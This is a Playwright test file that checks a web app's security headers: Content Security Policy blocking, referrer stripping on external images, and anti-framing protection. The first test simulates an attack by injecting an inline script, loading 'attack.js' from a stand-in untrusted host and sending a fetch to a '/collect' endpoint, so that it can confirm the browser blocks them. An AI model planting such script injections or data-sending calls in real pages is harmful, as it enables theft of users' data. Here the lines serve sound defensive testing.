import { expect, test } from "../e2e/fixtures";

test("production CSP blocks injected scripts and external connections", async ({ page }) => {
  await page.route("**/api/auth/me", route => route.fulfill({ status: 401, json: { detail: "Login required" } }));
  const response = await page.goto("/account/security");
  expect(response?.headers()["content-security-policy"]).toContain("script-src 'self'");
  await expect(page.getByRole("heading", { name: "Bezbednost naloga" })).toBeVisible();
  await page.evaluate(() => {
    const violations: string[] = [];
    Object.assign(window, { violations, injectedScriptRan: false });
    document.addEventListener("securitypolicyviolation", event => violations.push(`${event.effectiveDirective}:${event.blockedURI}`));
    const script = document.createElement("script");
    script.textContent = "window.injectedScriptRan = true";
    document.body.append(script);
    const external = document.createElement("script");
    external.src = "https://untrusted.example/attack.js";
    document.body.append(external);
    void fetch("https://untrusted.example/collect").catch(() => undefined);
  });
  await expect.poll(() => page.evaluate(() => (window as unknown as { violations: string[] }).violations)).toEqual(expect.arrayContaining([
    "script-src-elem:inline",
    expect.stringMatching(/^script-src-elem:https:\/\/untrusted\.example/),
    expect.stringMatching(/^connect-src:https:\/\/untrusted\.example/),
  ]));
  expect(await page.evaluate(() => (window as unknown as { injectedScriptRan: boolean }).injectedScriptRan)).toBe(false);
});

test("HTTPS images load without exposing the current page path or query", async ({ page }) => {
  await page.route("**/api/auth/me", route => route.fulfill({ status: 401, json: { detail: "Login required" } }));
  let referer = "";
  await page.route("https://images.example/photo.svg", route => {
    referer = route.request().headers().referer;
    return route.fulfill({ contentType: "image/svg+xml", body: '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20"/></svg>' });
  });
  await page.goto("/account/security?private=do-not-send");
  await page.evaluate(() => {
    const image = document.createElement("img");
    image.alt = "External photo";
    image.src = "https://images.example/photo.svg";
    document.body.append(image);
  });
  await expect(page.getByRole("img", { name: "External photo" })).toHaveJSProperty("naturalWidth", 20);
  expect(referer).toBe("http://127.0.0.1:18080/");
});

test("production pages cannot be embedded even by a same-origin parent", async ({ page }) => {
  const errors: string[] = [];
  page.on("console", message => { if (message.type() === "error") errors.push(message.text()); });
  await page.route("**/frame-test-parent", route => route.fulfill({ contentType: "text/html", body: '<iframe src="/account/security"></iframe>' }));
  await page.goto("/frame-test-parent");
  await expect.poll(() => errors.join("\n")).toMatch(/frame-ancestors|X-Frame-Options/i);
  await expect(page.frameLocator("iframe").getByRole("heading", { name: "Bezbednost naloga" })).toHaveCount(0);
});
